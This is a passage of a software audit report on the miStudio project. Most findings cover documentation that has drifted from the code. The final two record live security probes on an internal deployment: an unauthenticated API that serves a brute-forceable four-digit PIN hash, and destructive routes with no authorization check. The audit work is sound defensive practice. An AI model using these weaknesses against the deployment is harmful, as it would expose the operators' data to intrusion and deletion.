- **Claim:** Four `sed -i` substitutions set the GPU node, node IP, `SECRET_KEY` and Postgres password in `k8s/mistudio-deployment.yaml`.
- **Reality:** **none of the four target strings occur in the shipped manifest.** It was refactored to `secretKeyRef` against a `mistudio-secrets` Secret; `nodeSelector` is commented out. Worse, `sed -i "s/value: mistudio$/value: $POSTGRES_PASSWORD/g"` matches only `POSTGRES_DB: mistudio` and `POSTGRES_USER: mistudio` — it **renames the database and the user to the password string** and never sets a password. Neither install page mentions `k8s/mistudio-secrets.yaml.example` or the `kubectl create secret` step.
- **Why it matters:** `sed` exits 0 on zero matches, so every step "succeeds". The user believes they set a strong `SECRET_KEY` — the key protecting stored API keys — and a DB password. They set neither, and may have renamed the database.
- **Evidence:** verified-by-live-repro (grep count 0 for each target string)
- **Verification (R3):** **CONFIRMED**
- **Effort:** M

---

### MIS-E2E-153 — Five shipped features have no doc→code traceability at all
- **Phase / Round:** P11 / R1
- **Severity:** P1
- **Type:** debt
- **Location:** `0xcc/tasks/024_`–`028_FTASKS`; PPRD §2.1 rows 25–29; `CLAUDE.md` Document Inventory
- **Claim:** PPRD marks rows 25–29 "Planned"; the CLAUDE.md Document Inventory has **no entry at all** for files `024_`–`028_`; and those five FTASKS are exactly the ones missing `## Relevant Files`.
- **Reality:** substantial implementation exists for all five — `jlens_annotation.py`, `jlens_watchlist.py` (024); `jlens_intervention.py` + its worker (025); `jspace_claims.py` + `frontend/src/config/jspaceClaims.ts` (026); 20 MCP tools (028). Their FTASKS run 68–100% checked.
- **Why it matters:** the most recent tranche of work is invisible to **every** documented navigation path at once. There is no way to answer "what code implements feature 26?" from the doc chain.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** M

---

### MIS-E2E-154 — 22 `Relevant Files` entries point at files that were never written
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** worst: `003_FTASKS|SAE_Training` (3), `004_FTASKS|Feature_Discovery` (3), `008_FTASKS|System_Monitoring` (3)
- **Claim:** 273 paths extracted from the 23 FTASKS that have the section; **50 do not resolve**. Of those, 21 are relative-path style (cosmetic) and 7 are explicitly labelled "To Create". **22 are genuinely dead.**
- **The important part:** `git log --all --diff-filter=A` on 15 of the 22 shows **15 of 15 have zero add-commits in the entire repository history**. They are not renames or deletions — they never existed. E.g. `003_FTASKS:248-256` has four `[x]` boxes for a `TrainingForm.tsx` that has never existed. The capability exists (inline SVG charts in `TrainingCard.tsx:989-1059`), so this is a documentation defect — **except** Task 7.7's `- [x] Zoom and pan`, which has no implementation anywhere.
- **Why it matters:** for features 001–008 the sections appear to have been authored **from the design documents, not from the implementation**. The framework's documented join key is least reliable exactly where the docs claim 100% completion. Where the practice *is* followed it works: 013, 020 and 023 have zero dead paths and were verified against their commit windows.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** M

---

### MIS-E2E-155 — CLAUDE.md's own framework references are off by one, and point the reader at the wrong action
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `CLAUDE.md:336-343`, `:727`, `:1031`, `:17`, `:378`
- **Claim:** The "Instruction Documents Reference" lists `001_create-project-prd.md` … `008_housekeeping.md`.
- **Reality:** the directory holds `001_generate-brd.md`, `002_create-project-prd.md`, … `008_process-task-list.md`. **Every listed filename except `000_README.md` does not exist**, and `008_housekeeping.md` exists nowhere.
- **Why it matters:** worse than dead links, because the *numbers* still resolve to real but **wrong** documents. `CLAUDE.md:17` and `:378` both record the standing next action as *"execute … via `007_process-task-list.md`"* — but `007_` is now `generate-tasks.md`. Following CLAUDE.md's own instruction **re-generates the backlog instead of working it**.
- **Evidence:** verified-by-live-repro (`test -e` on each; both files' opening lines read to confirm semantics)
- **Verification (R3):** **CONFIRMED**
- **Effort:** S

---

### MIS-E2E-156 — IDL-5's architecture is inverted, and the error is propagated across five documents
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `PADR:2532-2536`; propagated to `README.md:54,82`, `CLAUDE.md:642,654,828,838,849`, `008_FTASKS:94,206`, `008_FTDD:181-193`, `PPRD:396`
- **Claim:** IDL-5 — *"Use Celery Beat scheduled task for system monitoring · Task: `collect_system_metrics` · Interval: Every 2 seconds"*.
- **Reality:** no task named `collect_system_metrics` exists. `beat_schedule` contains only janitors, the pruner, the GPU watchdog and the steering reconciler. Collection is an **asyncio loop inside the FastAPI process** (`background_monitor.py:31,72-90`, started at `main.py:57`). The code says so explicitly at `celery_app.py:341-343`: *"System metrics monitoring runs as an asyncio background task … (not Celery)"*. Only the 2 s interval survives.
- **Why it matters:** an operator debugging a dead dashboard inspects Celery Beat, which has nothing to do with it. And because collection lives in the API process, metrics stop on backend restart and duplicate across replicas — neither of which "Celery Beat" implies. **The correction reached exactly one document**: the 2026-07-10 review deleted `workers/system_monitor_tasks.py` and fixed `008_FPRD`, leaving five others asserting the deleted architecture.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** M

---

### MIS-E2E-157 — IDL-16's schema guard cannot do what the PADR says and cannot block startup
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `PADR:2767-2769`; `backend/src/db/schema_validator.py`
- **Claim:** *"Startup validator compares live DB schema against SQLAlchemy model metadata · detects missing columns, type mismatches, missing indexes · optionally blocks startup on critical mismatches."*
- **Reality:** it uses **no SQLAlchemy metadata**. `REQUIRED_TABLES` is a hand-maintained literal of 17 tables against 36 declared — `circuits`, `validation_manifests`, `agent_approval_requests`, `cluster_profiles`, `app_settings` and `steering_record_runs` are never checked, so the anti-drift tool drifts. It selects `column_name` only and diffs sets of names: no type check, no index check. Startup **cannot** be blocked — `validate_schema_on_startup` hardcodes `raise_on_error=False` and `main.py:52-55` continues anyway.
- **Why it matters:** the mechanism the PADR names as the defence against schema drift is a name-only spot check over less than half the schema that can never fail the boot. Three claims, none true.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Related:** MIS-E2E-032, MIS-E2E-048, MIS-E2E-051
- **Effort:** M

---

### MIS-E2E-158 — IDL-1 and IDL-12 document channel and event conventions the code does not use
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `PADR:2443`, `:2451-2455`, `:2691`, `:2694`; restated in CLAUDE.md's "Real-time Updates Architecture"
- **Claim:** channel pattern `{entity_type}/{entity_id}` with a table listing `training/{id}`, `extraction/{id}`, `model/{id}`, `dataset/{id}`; events *"lowercase with underscores (e.g. `download_progress`, `labeling_results`)"*; and *"standardize all WebSocket emissions through `websocket_emitter.py`"*.
- **Reality:** channels are **pluralised with a sub-path** — `trainings/{id}/progress`, `models/{id}/progress`, `datasets/{id}/tokenization/{tid}`. Subscribing per the PADR table yields silence. Events are colon-delimited `namespace:event` (`training:progress`, `system:metrics`); **neither cited example event exists**. And the highest-frequency emitter bypasses the standard emitter entirely — `background_monitor.py:174-197` builds its own httpx client and POSTs directly.
- **Evidence:** verified-by-live-repro; the frontend matches the code, not the PADR
- **Verification (R3):** **CONFIRMED**
- **Effort:** S

---

### MIS-E2E-159 — IDL-11's resilience decisions are unimplemented, and the exemplar task inverts one
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `PADR:2663`, `:2666`, `:2670-2679`
- **Claim:** retry with exponential backoff (`max_retries=3`, `countdown=60s`), a **dead-letter queue**, and a `training_task` code block showing `soft_time_limit=3600` and `raise self.retry(countdown=60 * (2 ** retries))`.
- **Reality:** no dead-letter queue exists anywhere. No exponential backoff — the only `countdown` in `backend/src` is in a docstring, and both real `self.retry()` sites pass none. The exemplar contradicts the snippet: `training_tasks.py:193-199` sets no `max_retries`, no `soft_time_limit`, and `acks_late=False` — a per-task **override** of the global `task_acks_late=True`.
- **Why it matters:** `README.md:52` leans on this — *"The queue is durable: restarting the application does not lose queued or in-progress tasks."* The global settings support that; the flagship task opts out of it.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** M

---

### MIS-E2E-160 — The manual describes a Settings PIN that gates one tab of five, and not the destructive one
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `manual/docs/advanced/settings-reference.md:56-58`, `:67`; `frontend/src/components/panels/SettingsPanel.tsx:67-71`
- **Claim:** *"the **panel** can be locked behind a PIN … from then on, opening Settings prompts for it once per session."*
- **Reality:** only the `api_keys` tab is wrapped in `<PinGate>`. The panel and tab bar render unconditionally. The **un-gated Storage tab** is the control that arms irreversible checkpoint deletion — `checkpoint_prune_dry_run`, where `false` means files are deleted.
- **Why it matters:** compounds with MIS-E2E-055 (the PIN is readable, rewritable and deletable through `/settings`) and MIS-E2E-002. `installation.md:74` recommends Kubernetes for *"shared lab environments and multi-user research clusters"*, and `reference/api/overview.md` never states the API is unauthenticated — so the PIN is the manual's **only** mention of access control, and it reads as a security model that does not exist.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** S

---

### MIS-E2E-161 — MCP docs omit a default-enabled category holding a GPU intervention tool
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `manual/docs/advanced/mcp-server.md:65`, `:87`, `:96`; `PADR:2968`
- **Claim:** the default `MCP_TOOL_CATEGORIES` is documented as `read,groups,steering,labeling,experiments,profiles,jobs,circuits`; the catalog is headed "13 categories"; and *"add `admin` to enable destructive deletes"*, with `admin` marked off by default.
- **Reality:** `config.py:15` includes **`jlens`** in the defaults — 20 tools including `run_jlens_intervention`, a real GPU intervention — and the category is **absent from the catalog entirely**. An operator copying the documented default into `.env` silently disables it. And `delete_circuit` is registered in the default-on `circuits` category, not `admin`, so leaving `admin` off per the manual still hands an agent a destructive delete. IDL-26 enumerates 7 categories where the code defines 14.
- **Evidence:** verified-by-live-repro; distinct from MIS-E2E-017 (the 92-vs-116 count)
- **Verification (R3):** **CONFIRMED**
- **Effort:** S

---

### MIS-E2E-162 — README's startup path cannot work for a fresh clone
- **Phase / Round:** P11 / R1
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `README.md:98`; `CLAUDE.md:57-79`; `start-mistudio.sh`
- **Claim:** *"A single `./start-mistudio.sh` command starts all six services… The NVIDIA Container Toolkit is the only prerequisite."* CLAUDE.md: *"ONE COMMAND to start everything"*, access at `http://mistudio.hitsai.local`.
- **Reality:** the script hardcodes `PROJECT_ROOT="/home/x-sean/app/miStudio"` and runs `set -e`, so `cd "$PROJECT_ROOT/backend"` aborts on any other clone. It starts only five containers from `docker-compose.dev.yml` and runs backend, Celery and frontend **on the host** — requiring a pre-existing `backend/venv/` it never creates, plus Node, `lsof` and `fuser`. Its domain is `dev-mistudio.hitsai.local`, not the documented one, so the `/etc/hosts` instruction produces an unreachable URL. `docker-compose.yml` declares 10 services, not six. The four other repo shell scripts hardcode the same home directory.
- **Why it matters:** it is the first thing a new user runs. Note the **real** Compose quickstart (`docker compose up -d`, per `install-guide-compose.md`) was verified to work — the defect is README pointing at the wrong script.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** S

---

### MIS-E2E-163 — CLAUDE.md contradicts itself on status, counts and paths
- **Phase / Round:** P11 / R1
- **Severity:** P3
- **Type:** doc-drift
- **Location:** `CLAUDE.md:5`, `:43`, `:47`, `:375`, `:436`, `:441`
- **Claim / reality:**
  - `:43` *"995 passed, 4 skipped"* vs `:5` *"backend 2461, frontend 1149"* vs measured **2,883 collected / 1,211**. Stale by ~2.9×.
  - `:47` names a manifest at `/home/sean/app/…` — a user that does not exist (`x-sean`) — while `:153` gives the correct in-repo path.
  - `:375` *"Feature 020 … impl PLANNED"* vs `:19` *"✅ FEATURE 20 … CLOSED"*.
  - `:441` *"Feature 022 … ⏳ In progress"* vs `:5` *"Shipped: … `021_*`"*.
  - `:436`/`:470` say `/jlens/readout` **returns 501**. Grep for `501` across `api/v1/endpoints/` returns **zero hits**; `jlens.py` implements readout, probe, fit, band-report, gate and annotate, and 29 files exist under `frontend/src/components/jlens/`. Understated status invites re-implementing shipped work.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** M

---

### MIS-E2E-164 — Four smaller doc defects
- **Phase / Round:** P11 / R1
- **Severity:** P3
- **Type:** doc-drift
- **Location / claim:**
  1. `README.md:50` enumerates *"Every panel"* and omits **Clusters, Circuits and J-Lens** — the registry declares 13. README mentions the MCP server, circuits, clusters and J-Lens **nowhere**; it is roughly PPRD rows 11–29 out of date while presenting itself as exhaustive.
  2. `manual/docs/reference/data-model.md:9` states the page is *"verified against the ORM models"* — it asserts a verification it does not have (see MIS-E2E-050, 11 tables missing).
  3. `install-guide-compose.md:341` documents `NGINX_HTTP_PORT`, which appears nowhere in the repo; the port is hardcoded at `docker-compose.yml:281`.
  4. `PADR:2718` (IDL-13) claims `model_loader.py` uses `discover_transformer_structure` — it never imports it, carrying only a pointer comment. The substantive claim (no architecture whitelist) **holds**: `SUPPORTED_ARCHITECTURES` exists nowhere.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** **CONFIRMED**
- **Effort:** S

---

## P12 — Cross-cutting synthesis & live journeys

---

### MIS-E2E-165 — Live confirmation: the PIN hash is served unmasked by the production API
- **Phase / Round:** P12 / live verification
- **Severity:** **P0**
- **Type:** security
- **Location:** live `GET /api/v1/settings` on `k8s-mistudio.hitsai.local`
- **Claim:** MIS-E2E-055 predicted this from source. Confirmed against the running deployment:
  ```
  settings rows returned: 9
  key=settings_pin_hash  is_sensitive=False  masked=False  value_len=150
  >>> EXPOSED: returned in the clear, not masked
  ```
  A 150-character PBKDF2 salt+hash, unauthenticated, from a single GET. The PIN space is four digits — 10,000 offline candidates.
- **Verification (R3):** **CONFIRMED LIVE.** This closes MIS-E2E-055's most severe branch: it is not a latent code defect, it is currently exposed on the deployment the team uses.
- **Honest qualifier:** the same probe reported "sensitive rows correctly masked: 0" — that is because **no sensitive rows are currently populated** (no API keys stored right now), not because masking is broken. Masking of `is_sensitive` rows was verified correct at source in P02. The PIN's exposure is caused by it being written `is_sensitive=False`, not by a masking failure.
- **Effort:** M (see MIS-E2E-055)

---

### MIS-E2E-166 — Live confirmation: no authorization layer exists on destructive routes
- **Phase / Round:** P12 / live verification
- **Severity:** P2 *(the posture is accepted; this records that it is real in production)*
- **Type:** security
- **Location:** live, `k8s-mistudio.hitsai.local`
- **Claim:** Probed with **nonexistent ids**, so nothing was deleted. A 401/403 would prove an auth layer; a 404/422 proves the request reached the handler and failed only on the object:
  ```
  DELETE /api/v1/trainings/train_NOPE_audit    404
  DELETE /api/v1/circuits/crc_NOPE_audit       404
  DELETE /api/v1/settings/nonexistent_audit_key 404
  DELETE /api/v1/datasets/ds_NOPE_audit        422
  ```
  No route returned 401 or 403. The handler is reached in every case.
- **Why it is P2 and not P0:** MIS-E2E-002 records the no-app-auth posture as **accepted** — nginx plus network isolation is the intended control. This finding is not "there is no auth"; it is the live confirmation that the posture is real in production, which the accepted-posture decision was taken *about*. It is recorded so the remediation tasklist's PADR-IDL item (MIS-E2E-002) has evidence attached rather than an assumption.
- **What it does NOT excuse:** MIS-E2E-055/165 (the PIN, whose entire threat model is the population the boundary admits), MIS-E2E-069 (credential exfiltration), MIS-E2E-070/071 (arbitrary `rmtree`), MIS-E2E-099 (restart loop), MIS-E2E-003 (`pkill`/`Popen`), and MIS-E2E-105 (any-origin WebSocket, which changes *who* can reach the host).
- **Verification (R3):** **CONFIRMED LIVE**
- **Effort:** — (covered by MIS-E2E-002)
